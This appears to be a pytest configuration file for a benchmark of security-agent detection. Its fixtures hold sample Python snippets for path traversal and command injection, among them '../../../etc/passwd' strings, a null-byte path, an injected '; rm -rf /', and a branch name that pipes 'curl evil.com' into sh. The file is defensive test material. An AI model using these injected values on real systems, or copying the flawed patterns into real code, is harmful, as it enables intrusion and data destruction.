"""
pytest configuration for security agent benchmarks.

This module provides fixtures and utilities for testing security agent
detection capabilities against known vulnerable Python code patterns.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest


@dataclass
class VulnerablePattern:
    """Represents a vulnerable code pattern for testing."""

    cwe_id: str
    pattern_id: str
    code: str
    description: str
    expected_severity: str
    source: str
    is_false_positive: bool = False


@dataclass
class DetectionResult:
    """Represents an agent detection result."""

    detected: bool
    severity: str | None
    description: str | None
    confidence: float


@pytest.fixture
def benchmarks_dir() -> Path:
    """Return the benchmarks directory path."""
    return Path(__file__).parent


@pytest.fixture
def vulnerable_samples_dir(benchmarks_dir: Path) -> Path:
    """Return the vulnerable samples directory path."""
    samples_dir = benchmarks_dir / "vulnerable_samples"
    samples_dir.mkdir(exist_ok=True)
    return samples_dir


@pytest.fixture
def cwe22_patterns() -> list[VulnerablePattern]:
    """Return CWE-22 path traversal test patterns (Python)."""
    return [
        VulnerablePattern(
            cwe_id="CWE-22",
            pattern_id="PT-001",
            code=r'''
# VULNERABLE: CWE-22 startswith without path normalization
# EXPECTED: CRITICAL - Path traversal via .. sequences
# SOURCE: PR #752 (Python equivalent)
output_file = "../../../etc/passwd"
if not output_file.startswith(memories_dir):
    print(f"Warning: Output file should be in {memories_dir}")
# WARNING ONLY - attack succeeds
''',
            description="startswith without realpath allows directory escape",
            expected_severity="CRITICAL",
            source="PR #752",
        ),
        VulnerablePattern(
            cwe_id="CWE-22",
            pattern_id="PT-002",
            code=r'''
# VULNERABLE: CWE-22 os.path.join with absolute path bypass
# EXPECTED: HIGH - os.path.join ignores base when child is absolute
# SOURCE: Synthetic
user_input = "/etc/passwd"
safe_dir = "/app/data"
full_path = os.path.join(safe_dir, user_input)
# full_path is now /etc/passwd, not under safe_dir
''',
            description="os.path.join ignores base directory for absolute paths",
            expected_severity="HIGH",
            source="Synthetic",
        ),
        VulnerablePattern(
            cwe_id="CWE-22",
            pattern_id="PT-003",
            code=r'''
# VULNERABLE: CWE-22 Symlink bypass
# EXPECTED: HIGH - TOCTOU race with symlink
# SOURCE: Synthetic
path = user_input
if os.path.isfile(path):
    # Attacker replaces file with symlink here
    with open(path) as f:  # Follows symlink to arbitrary file
        content = f.read()
''',
            description="Symlink created between check and use",
            expected_severity="HIGH",
            source="Synthetic",
        ),
        VulnerablePattern(
            cwe_id="CWE-22",
            pattern_id="PT-004",
            code=r'''
# VULNERABLE: CWE-22 Null byte injection
# EXPECTED: CRITICAL - Null byte truncates path validation
# SOURCE: Synthetic
user_input = "../../etc/passwd\x00.txt"
_, extension = os.path.splitext(user_input)
if extension == ".txt":
    # Passes validation but \x00 truncates in some APIs
    with open(user_input) as f:
        content = f.read()
''',
            description="Null byte truncates path in validation",
            expected_severity="CRITICAL",
            source="Synthetic",
        ),
        VulnerablePattern(
            cwe_id="CWE-22",
            pattern_id="PT-005",
            code=r'''
# SAFE: Proper path validation with realpath
# EXPECTED: PASS - This should NOT be flagged
# SOURCE: GitHubCore.psm1 Test-SafeFilePath (Python equivalent)
def test_safe_file_path(path: str, allowed_root: str) -> bool:
    normalized_path = os.path.realpath(path)
    normalized_root = os.path.realpath(allowed_root)
    return normalized_path.startswith(normalized_root + os.sep)
''',
            description="Correct path validation pattern",
            expected_severity="PASS",
            source="GitHubCore.psm1",
            is_false_positive=True,
        ),
    ]


@pytest.fixture
def cwe77_patterns() -> list[VulnerablePattern]:
    """Return CWE-77 command injection test patterns (Python)."""
    return [
        VulnerablePattern(
            cwe_id="CWE-77",
            pattern_id="CI-001",
            code=r'''
# VULNERABLE: CWE-77 shell=True with user input
# EXPECTED: CRITICAL - Shell metacharacters can inject commands
# SOURCE: PR #752 (Python equivalent)
query = "; rm -rf /"  # User input
cmd = f"npx tsx {plugin_script} {query} {output_file}"
subprocess.run(cmd, shell=True)
# Runs TWO commands: npx tsx ... AND rm -rf /
''',
            description="shell=True with user input allows shell metacharacter injection",
            expected_severity="CRITICAL",
            source="PR #752",
        ),
        VulnerablePattern(
            cwe_id="CWE-77",
            pattern_id="CI-002",
            code=r'''
# VULNERABLE: CWE-77/CWE-94 dynamic code with user input
# EXPECTED: CRITICAL - Arbitrary code execution
# SOURCE: Synthetic
user_command = input("Enter command: ")
# Vulnerable: runs arbitrary Python code from user input
''',
            description="Dynamic code running arbitrary user code",
            expected_severity="CRITICAL",
            source="Synthetic",
        ),
        VulnerablePattern(
            cwe_id="CWE-77",
            pattern_id="CI-003",
            code=r'''
# VULNERABLE: CWE-94 dynamic code with config value
# EXPECTED: HIGH - Code injection via configuration
# SOURCE: Synthetic
config = json.load(open("config.json"))
template = config["template"]
# Vulnerable: Template can contain dangerous code
''',
            description="Dynamic code allows code injection via config",
            expected_severity="HIGH",
            source="Synthetic",
        ),
        VulnerablePattern(
            cwe_id="CWE-77",
            pattern_id="CI-004",
            code=r'''
# VULNERABLE: CWE-77 Shell metacharacters in git command
# EXPECTED: CRITICAL - Command chaining
# SOURCE: Synthetic
branch_name = os.environ.get("BRANCH_NAME")  # User-controlled
subprocess.run(f"git checkout {branch_name}", shell=True)
# If BRANCH_NAME = "main; curl evil.com | sh" -> runs malicious code
''',
            description="subprocess with shell=True and environment variable",
            expected_severity="CRITICAL",
            source="Synthetic",
        ),
        VulnerablePattern(
            cwe_id="CWE-77",
            pattern_id="CI-005",
            code=r'''
# SAFE: List arguments prevent injection
# EXPECTED: PASS - This should NOT be flagged
# SOURCE: Safe pattern
query = "; rm -rf /"  # User input (malicious)
subprocess.run(["npx", "tsx", plugin_script, query, output_file], check=True)
# List arguments prevent metacharacter interpretation
''',
            description="List arguments prevent injection",
            expected_severity="PASS",
            source="Safe pattern",
            is_false_positive=True,
        ),
    ]


def verify_detection(
    pattern: VulnerablePattern,
    agent_findings: list[dict[str, Any]],
) -> DetectionResult:
    """
    Verify if the security agent detected the pattern.

    Args:
        pattern: The vulnerable pattern to check
        agent_findings: List of findings from security agent

    Returns:
        DetectionResult with detection status and details
    """
    for finding in agent_findings:
        finding_cwe = finding.get("cwe_id", "").upper()
        if pattern.cwe_id.upper() in finding_cwe:
            return DetectionResult(
                detected=True,
                severity=finding.get("severity"),
                description=finding.get("description"),
                confidence=finding.get("confidence", 1.0),
            )

    return DetectionResult(
        detected=False,
        severity=None,
        description=None,
        confidence=0.0,
    )
